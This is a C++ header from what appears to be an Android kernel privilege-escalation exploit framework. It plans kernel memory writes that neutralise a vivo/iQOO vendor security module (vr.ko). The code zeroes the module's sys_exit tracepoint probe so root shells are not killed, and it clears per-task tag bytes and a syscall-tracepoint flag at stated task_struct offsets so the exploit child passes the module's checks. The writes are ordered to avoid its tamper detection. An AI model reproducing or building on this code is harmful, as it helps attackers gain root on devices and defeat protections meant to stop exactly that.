#ifndef GHOSTLOCK_VR_GUARD_HPP
#define GHOSTLOCK_VR_GUARD_HPP

#include "kernel/target.h"
#include "profile/model.h"
#include "session/ancillary/ancillary_policy.hpp"
#include "support/status.hpp"

#include <cstddef>
#include <cstdint>
#include <optional>

namespace ghostlock::session::ancillary {
    /* vivo/iQOO vr.ko marks an app-origin task with tag A (task_struct+0x06),
     * tag B (task_struct+0x2c) and the syscall-tracepoint bit
     * (thread_info.flags 0x400), and separately arms a sys_exit tracepoint
     * probe that kills any task reaching euid 0. Neutralization is therefore
     * two layers: a global probe disarm at PreSpawn (so root shells survive)
     * and a per-task tag clear at PostSpawn (so the exploit child survives W2
     * verify).
     *
     * The exploit write primitive is 64-bit granular, so tag A and the flag bit
     * are cleared together by zeroing the whole thread_info flags word at
     * task_struct+0x00. That is why they carry no profile field: only tag B
     * needs a byte-granular write, and only tag B's offset is configurable. */
    inline constexpr uint32_t VR_TAG_A_OFF = 0x06;
    inline constexpr uint32_t VR_SYSCALL_TP_FLAG = 0x400;

    /* The tags and the flag bit must stay inside the word the plan zeroes.
     * thread_info.flags is a 32-bit field at task_struct+0x00, so tag A (a byte
     * of that word) and the syscall-tracepoint bit (bit 10 of the field) are
     * both covered by clearing the single 8-byte word. */
    inline constexpr uint32_t THREAD_INFO_FLAGS_BITS = 32;

    static_assert(VR_TAG_A_OFF < sizeof(uintptr_t),
                  "tag A must lie inside the cleared thread_info flags word");
    static_assert(
        VR_SYSCALL_TP_FLAG != 0 && (VR_SYSCALL_TP_FLAG & (VR_SYSCALL_TP_FLAG - 1)) == 0 &&
            VR_SYSCALL_TP_FLAG <= ((1UL << THREAD_INFO_FLAGS_BITS) - 1),
        "the syscall-tracepoint flag must be a single bit inside thread_info.flags");

    /* One planned write. `desc` is the log label the write primitive prints. */
    struct VrWrite final {
        const char *desc;
        uintptr_t target;
    };

    /* Per-task plan: the flags word is always written, tag B only when the
     * profile supplies its offset.
     *
     * MEMBER ORDER IS EXECUTION ORDER (clear_tags writes them in this order) and
     * it is deliberate: `flags` first, because it carries the syscall-tracepoint
     * bit that takes the task off the sys_exit slow path immediately, while the
     * tag bytes are tamper-checked by vr.ko. Clearing the bit first closes the
     * window in which the probe is still armed but the tag is already gone.
     * Do not reorder. */
    struct VrTagPlan final {
        VrWrite flags;
        std::optional<VrWrite> tag_b;
    };

    /* The primitive stores whole 8-byte words, so a byte-granular field is
     * cleared by aligning its address down to the word that contains it. */
    [[nodiscard]] constexpr uintptr_t vr_align_down_word(uintptr_t addr) noexcept {
        return addr & ~static_cast<uintptr_t>(7);
    }

    /* PreSpawn plan: disarm vr's sys_exit probe by zeroing tracepoint.funcs.
     * `funcs_offset` is offsetof(struct tracepoint, funcs) and comes from the
     * profile, never from the kernel release string. A profile that does not
     * describe the tracepoint layout yields no plan, so the behavior fails
     * closed instead of writing at a guessed offset. */
    [[nodiscard]] constexpr std::optional<VrWrite>
    vr_plan_probe(std::optional<uint32_t> funcs_offset,
                  uintptr_t sys_exit_tp_addr) noexcept {
        if (!funcs_offset.has_value() || sys_exit_tp_addr == 0) {
            return std::nullopt;
        }
        return VrWrite{"VR-global: sys_exit tp->funcs",
                       sys_exit_tp_addr + *funcs_offset};
    }

    [[nodiscard]] constexpr VrTagPlan
    vr_plan_tags(std::optional<uint32_t> tag_b_off, uintptr_t child_task) noexcept {
        return VrTagPlan{
            .flags = VrWrite{"VR: flags+tagA",
                             child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF},
            .tag_b = tag_b_off
                         ? std::optional<VrWrite>{
                               VrWrite{"VR: tagB",
                                       vr_align_down_word(child_task + *tag_b_off)}}
                         : std::nullopt,
        };
    }

    /* The behavior. Everything that touches the kernel lives in vr_guard.cpp. */
    struct VrGuardPolicy : AncillaryPolicyDefaults {
        static constexpr AncillaryKind kind = AncillaryKind::VrGuard;

        /* The profile gate. It reads the decoded `vr_guard` section rather than
         * the session profile, because that section is a decode side output (see
         * profile::vr_guard_layout). Only `off_vr_sys_exit_tp` is read from the
         * session, via `session.profile`; `enabled`, `funcs_offset` and
         * `tag_b_off` all come from the side output. The `TargetProfile`
         * parameter is unused but part of the behavior contract every policy
         * shares. Fails closed when the section is absent. */
        static bool enabled(const profile::TargetProfile &) noexcept {
            return profile::g_vr_guard_layout.enabled.value_or(0) != 0;
        }

        template <class Middleware>
        static Status apply(AncillaryStage stage, ExploitSession &session,
                            AncillaryContext &context);
    };
} // namespace ghostlock::session::ancillary

#endif